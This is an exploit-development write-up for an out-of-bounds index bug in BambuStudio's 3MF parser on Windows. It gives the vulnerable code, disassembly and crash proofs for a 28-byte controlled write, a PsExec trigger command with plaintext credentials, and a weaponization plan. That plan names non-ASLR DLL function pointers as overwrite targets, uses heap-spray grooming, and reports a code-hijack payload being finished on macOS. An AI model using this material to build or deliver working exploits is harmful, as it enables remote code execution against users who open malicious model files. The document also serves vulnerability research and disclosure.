# 3MF cut_information.xml OOB index → controlled write-what-where (BambuStudio, Windows)

**Bug** (`src/libslic3r/Format/bbs_3mf.cpp`, cut-connector apply loop):

```cpp
model_object->volumes[connector.volume_id]->cut_info =
    ModelVolume::CutInfo(type, radius, height, r_tolerance, h_tolerance, true);
```

`volume_id`, `type`, and the four floats come **raw** from `Metadata/cut_information.xml`
(`get<int>`/`get<float>`), unbounded. `volumes` is `std::vector<ModelVolume*>`, so
`volumes[volume_id]` = `*(data() + volume_id*8)` is an **OOB pointer read at an
attacker-scaled offset**; the subsequent `->cut_info = CutInfo(...)` **writes
attacker-controlled bytes through that pointer**. Fixed upstream in `5829aa45f`
(2026-08-22, BambuLab); vulnerable **≤ v02.08.02.61**.

---

## Test rig (fully autonomous — no user interaction)

- Target: BambuStudio **v02.08.02.61** on Win11 Pro (dev0, 192.168.0.33, user poctest).
- **Trigger (previously the open problem — SOLVED):** the SSH shell runs in **session 0**
  (services window station, 0 visible windows); BambuStudio's GUI/import lives in the
  **active console session 2** (poctest). poctest is a local admin with a high-IL token, so:

  ```
  PsExec64.exe -accepteula -nobanner -i 2 -u poctest -p test1234 -d \
      "C:\Program Files\Bambu Studio\bambu-studio.exe" <file.3mf>
  ```

  launches into session 2's desktop and **imports + crashes with no double-click**.
- Crash capture: WER LocalDumps → `C:\dumps` (`DumpType=1` mini, ~35 MB for fast iteration).
- Parser: `cutparse.py` / `ripmod.py` with `C:\Program Files\Python312\python.exe`.
- Loop driver: `wloop.py` (build 3mf → PsExec `-i 2` → poll dump → parse).
- **3mf build gotcha:** a freshly `zipfile`-built 3mf does **not** trigger the cut path
  (Python omits zip directory entries). The loop **clones the proven `evil.3mf` container
  verbatim and swaps only `Metadata/cut_information.xml`.**
- Local `BambuStudio.dll` == box (MD5 `27203D4DF522ADC75FB07E8DFEA4BEC1`), so static
  disassembly is authoritative.

---

## The vulnerable code (BambuStudio.dll, disassembled at the fault RVA)

Faulting RIP mapped to **`BambuStudio.dll + 0x188324f`** (module base `0x7ffeb4440000`,
**stable across runs** — no effective DLL ASLR):

```
+0x1883235: movups xmm1, [rax]           ; CutInfo bytes  0x00..0x0f  (from XML)
+0x1883238: movsd  xmm0, [rax+0x10]      ; CutInfo bytes  0x10..0x17
+0x188323d: mov    r8d,  [rax+0x18]      ; CutInfo bytes  0x18..0x1b
+0x1883245: movsxd rcx, eax              ; rcx = volume_id (sign-extended, from XML)
+0x1883248: mov    rax, [rsi+0x88]       ; rax = volumes.data()   (rsi = model_object)
+0x188324f: mov    rdx, [rax+rcx*8]      ; rdx = P = *(data()+vid*8)   ← OOB READ (fault site)
+0x1883253: movups [rdx+0x1e8], xmm1     ; ← 16-byte controlled WRITE @ P+0x1e8
+0x188325a: movsd  [rdx+0x1f8], xmm0     ; ←  8-byte controlled WRITE @ P+0x1f8
+0x1883262: mov    [rdx+0x200], r8d      ; ←  4-byte controlled WRITE @ P+0x200
+0x1883269: add    rbx, 0x18            ; next connector (stride 0x18)
```

**28 attacker-controlled bytes** (radius / height / r_tolerance / h_tolerance / type,
all from the connector element) are written at **P + 0x1e8**, where **P is the value
read from `data() + volume_id*8`**. This is the x64 analog of the macOS site
(`str q0,[x10,#0x1e0]`), at struct offset `0x1e8`.

---

## Proof 1 — the OOB read address is fully attacker-controlled (LOAD fault)

`evil.3mf` with `volume_id = 134217728 (0x08000000)`, autonomously:

```
EXCEPTION 0xc0000005 (ACCESS_VIOLATION) READ
fault = 0x261a10ba120
rax   = 0x261610ba120   = volumes.data()
rcx   = 0x08000000      = our volume_id
rax + rcx*8 = 0x261a10ba120 == fault   (EXACT)
rip   = BambuStudio.dll + 0x188324f    (the OOB load)
```

The read location is exactly `data() + volume_id*8` — the attacker picks it.

## Proof 2 — the controlled write EXECUTES through P (STORE faults)

`wloop.py` sweep (each row a separate autonomous run); every store fault is at
`rip = BambuStudio.dll + 0x1883253` = `movups [rdx+0x1e8], xmm1`:

```
vid=256        WRITE  fault=0x7ffeb95b2938   P=0x7ffeb95b2750  (slot held a module-region ptr; store hit a read-only page)
vid=4096       WRITE  fault=0x1e8            P=0x0             (slot NULL → clean NULL+0x1e8 write)
vid=16777216   WRITE  fault=0x1e8            P=0x0
vid=-256       WRITE  fault=0x1e8            P=0x0
vid=1000000    READ   (LOAD)                                   slot unmapped
vid=-65536     READ   (LOAD)                                   slot unmapped
```

`fault = P + 0x1e8` on every store fault confirms the CutInfo write dispatches through
the attacker-selected pointer `P`. When `P` points to **writable** memory the write
**succeeds silently** (adjacent-object / arbitrary-heap corruption, no crash).

---

## Impact / weaponization status

- **Primitive:** controlled write-what-where — 28 chosen bytes at `P + 0x1e8`, with `P`
  selected from `data() + volume_id*8`. **Not** a DoS (contrast the ADMesh `/GS` STL bug,
  which is crash-only on Windows).
- **Favourable target environment (all fixed addresses):** BambuStudio.dll base is stable
  across runs; `libgmp-10.dll` (0x6acc0000) and `libmpfr-4.dll` (0x6f540000) are non-ASLR
  with writable global function pointers (`__gmp_free_func`, `__gmp_allocate_func`) — ideal
  write destinations that are later called. CFG is OFF.
- **Reachable-target recon (full-dump heap walk, `slotwalk.py`/`slotscan.py`):** the
  region right after `volumes.data()` (reachable by modest `volume_id`) holds a mix of
  real heap object pointers, **pointers into BambuStudio.dll**, and UTF-16 locale/date
  strings. A scan of k=0..200000 found **87 slots whose `P + 0x1e8` lands in the DLL's
  writable `.data`** (clusters e.g. k≈950–2100 → `DLL+0x6481xxx`, k≈76168–76198 →
  `DLL+0x6516xxx`) — i.e. useful fixed-target write destinations are *reachable*.
- **Stability caveat (two full dumps compared):** the slot→value layout is **NOT stable
  across runs.** `data()` is a fresh per-run heap allocation and the structure that
  follows it is a locale/date table keyed to the current day (dump1 k=4/5="Tuesday",
  dump2 k=8/9="Thursday"; dump1 k=16=a DLL pointer, dump2 k=16=UTF-16 "Febr"). So the 87
  writable-target slots are run-specific, not fixed indices.
- **Grooming experiment (marker-mesh spray, `build_spray.py` + `winmarker.py`):** a 3mf
  that sprays the heap with many small meshes whose vertex bytes are a chosen 8-byte
  marker. Because the marker *content* is attacker-chosen, a `volume_id` that lands in a
  spray buffer yields `P` = **any** value we like — including a fixed non-ASLR target
  address written as data — so the whole problem reduces to finding **one reliable
  `volume_id`** that lands in a marker buffer. The spray works (markers land in reach:
  ~39k hits with 720-byte meshes, ~1.8M hits with 96 KB meshes), but:
  - **Windows ASLR defeats it.** Across two runs of the *identical* spray 3mf, the
    marker set has **zero** overlapping `volume_id`s. The nearest marker sat at
    `vid=62076` one run and `vid=335844` the next; with big buffers the whole spray
    shifted by **~1.3 GB** (`vid` −166M) between runs. The spray-to-`data()` distance is
    randomized far beyond the spray's own extent, so no fixed `volume_id` is reliable.
  - Contrast **macOS**: with ASLR disabled the heap is **deterministic** — the identical
    3mf produces byte-identical `data()` and slot contents across runs (verified). So the
    reliable-`P` grooming is tractable on macOS and is where a chosen-`P` → code-pointer
    hijack → payload is being finished.
- **Verdict:** Windows *tooling* is easy (autonomous trigger + full-dump heap walk), but
  Windows *single-shot RCE* needs an info leak (defeat ASLR) or precise same-size
  adjacent-allocation grooming — not the naive spray. The write-what-where itself
  (attacker-chosen fault address, 28-byte controlled write executing through `P`, fixed
  DLL base, reachable writable targets) is fully proven live and autonomous; only the
  reliable-`P` step is ASLR-blocked here.

## Artifacts
`/tmp/win/{evil.3mf, wloop.py, cutparse.py, ripmod.py, modbase.py, BambuStudio.dll}`;
on box `C:\poc\{evil.3mf, wloop.py, cutparse.py, ripmod.py, base_x\}`, dumps in `C:\dumps`.
